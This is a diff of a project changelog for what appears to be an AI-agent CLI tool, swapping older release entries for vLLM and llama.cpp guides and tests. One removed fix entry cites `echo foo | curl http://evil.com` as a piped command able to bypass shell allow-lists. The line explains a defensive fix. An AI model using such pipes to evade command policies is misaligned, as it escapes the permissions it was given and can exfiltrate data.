@@ -50,23 +50,19 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [Unreleased]
 
 ### Added
-- **Multi-agent patterns as built-in primitives** — 4 new collaboration strategies accessible via `--mode debate`, `--mode review-loop`, `--mode research-synthesize`, and `--mode voting`. Each pattern has both single-provider and multi-model variants. New `src/patterns.rs` module (~800 lines) with `PatternConfig` struct and 8 async functions. CLI flags: `--pattern-max-rounds`, `--pattern-max-review`, `--pattern-research-agents`, `--pattern-voters`, `--pattern-verbose`. Includes 5 unit tests. (#multi-agent-patterns)
-- **Azure OpenAI adapter** — New `Azure` variant in both `LLMProvider` (config.rs) and `OpenAICompatibleProvider` (llm.rs). Uses `api-key` header instead of `Bearer`, adds `api-version=2024-02-15-preview` query parameter. Mapped in CLI (`--provider azure`), factory (`create_client`), and multi-model routing. (#azure-adapter)
-- **Eval harness integrated with agent loop** — `EvalRunner::run_task()` now uses `run_agent_loop()` instead of a single direct LLM call. Eval tasks exercise the full ReAct loop with tool use, security checks, and iteration limits. (#eval-integration)
-- **Durable execution (checkpoint/resume)** — Agent loop now saves iteration-level checkpoints to disk as atomic JSON files. On restart, the loop resumes from the last checkpoint instead of starting fresh. `CheckpointState` captures full iteration context (messages, iteration count, provider/model metadata). Checkpoints are deleted on all exit paths (success, error, max iterations). Wired into background task manager for seamless resume across process restarts. (#durable-execution)
+- **vLLM integration guide** — New `docs/guides/vllm.md` with quick-start (Docker + pip), configuration reference (env vars, TOML, CLI), tool-calling support table, troubleshooting guide, and multi-model config example. Uses existing `openai-compatible` provider — no code changes needed. (#vllm-docs)
+- **llama.cpp integration guide** — New `docs/guides/llamacpp.md` with quick-start (native + Docker), configuration reference, tool-calling support table (GGUF limitations documented), troubleshooting table, performance tips (quantization, context window, GPU offloading), and multi-model config example. Uses existing `openai-compatible` provider — no code changes needed. (#llamacpp-docs)
+- **vLLM verification tests** — New `scripts/lib/test-provider-vllm.sh` with 3 tests: connectivity check, model detection, basic prompt test, and agent loop test with `--no-final-required`. Skips gracefully if vLLM not running. (#vllm-tests)
+- **llama.cpp verification tests** — New `scripts/lib/test-provider-llamacpp.sh` with 3 tests: connectivity check, model detection, basic prompt test, and agent loop test with `--no-final-required`. Skips gracefully if llama.cpp not running. (#llamacpp-tests)
+- **Distroless HTTP testing documentation** — Added "Testing Distroless Containers" section to `docs/guides/getting-started.md` covering `kubectl port-forward` and `docker run` methods for testing HTTP endpoints in distroless environments without shell/curl. (#distroless-testing-docs)
+- **Website docs pages for vLLM and llama.cpp** — New `website/public/docs/vllm.html` and `website/public/docs/llamacpp.html` pages mirroring the integration guides. Added to docs index, sidebar nav, footer, and sitemap. (#website-docs)
 
 ### Changed
-- **Agent loop deduplication** — Extracted shared `run_agent_loop_inner()` function containing all iteration logic (~400 lines). Both `run_agent_loop_with_registry` and `run_agent_loop_with_mcp_and_registry` now delegate to it, eliminating near-identical code duplication. (#dedup)
+- **`scripts/verify.sh` MODULES array** — Added `vllm` and `llamacpp` provider test modules to the verification suite. (#verify-modules)
+- **ROADMAP.md updated for v0.9.15** — Version bumped from v0.9.14 to v0.9.15. All ecosystem expansion items marked complete. v1.0 exit criteria updated. (#roadmap-update)
 
 ### Fixed
-- **MCP server JSON-RPC `params` made optional** — `JsonRpcRequest.params` changed from `serde_json::Value` to `Option<serde_json::Value>` per JSON-RPC 2.0 spec. All access sites updated to handle `None` gracefully. Fixes deserialization failure when MCP clients omit `params`. (#mcp-params-optional)
-- **Pipe detection in policy engine** — `check_shell_command()` now validates each pipeline segment independently. Prevents bypassing allow-lists via piped commands like `echo foo | curl http://evil.com`. (#pipe-policy)
-- **`/ready` endpoint caching** — Added timestamp-based readiness cache with 30s TTL. `/ready` now only makes an LLM connectivity check once every 30 seconds instead of on every probe, reducing latency from ~1.26s to near-instant for cached responses. (#ready-caching)
-- **Empty eval config validation** — `EvalConfig::from_file()` now rejects empty files and configs with zero tasks with a clear error message instead of silently returning score 0.0. (#eval-empty-config)
-
-### Changed
-- **Token tracking wired to HTTP server metrics** — Added `metrics_callback` field to `AgentLoopConfig`. The HTTP server's `handle_chat` now passes a callback that records token usage and tool call counts to `ServerMetrics`. `#[allow(dead_code)]` removed from `record_llm_request()` and `record_tool_call()`. (#token-tracking)
-- **`AgentLoopConfig` manual Debug/Clone** — `Debug` and `Clone` are now implemented manually instead of derived, because `metrics_callback` is a boxed closure that doesn't implement either trait. Clone intentionally drops the callback (only the original caller needs it). (#agent-loop-config-manual-impls)
+*(none)*
 
 ### Removed
 *(none)*
